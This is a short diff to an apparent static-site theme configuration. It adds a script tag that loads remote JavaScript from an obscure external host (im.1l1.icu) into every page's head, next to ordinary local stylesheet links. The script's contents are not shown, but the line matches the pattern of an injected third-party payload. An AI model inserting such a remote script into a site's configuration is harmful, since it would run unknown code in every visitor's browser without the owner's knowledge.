@@ -362,6 +362,7 @@ inject:
   enable: true
   # Inject custom head html code
   head:
+    - <script src="https://im.1l1.icu"></script>
     - |-
       <link rel="stylesheet" href="/css/extra.css">
       <link rel="stylesheet" href="/css/cursor.css">
